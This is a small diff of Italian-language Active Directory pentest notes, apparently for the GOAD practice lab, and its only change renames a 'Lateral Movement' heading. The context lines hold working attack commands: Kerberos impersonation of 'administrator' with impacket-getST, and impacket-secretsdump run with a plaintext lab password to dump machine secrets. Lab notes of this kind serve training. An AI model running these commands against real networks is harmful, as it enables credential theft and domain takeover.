@@ -185,7 +185,7 @@ export KRB5CCNAME=./krbrelay\$.ccache
 impacket-getST -impersonate 'administrator' -spn 'CIFS/castelblack.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'krbrelay$'
 ```
 
-### **Lateral Movement**
+### **Lateral Movement - Dumping**
 Prima di saltare da una macchina all'altra è essenziale ottenere tutti i "Secrets" della macchina pwnata.
 ```bash
 impacket-secretsdump NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22
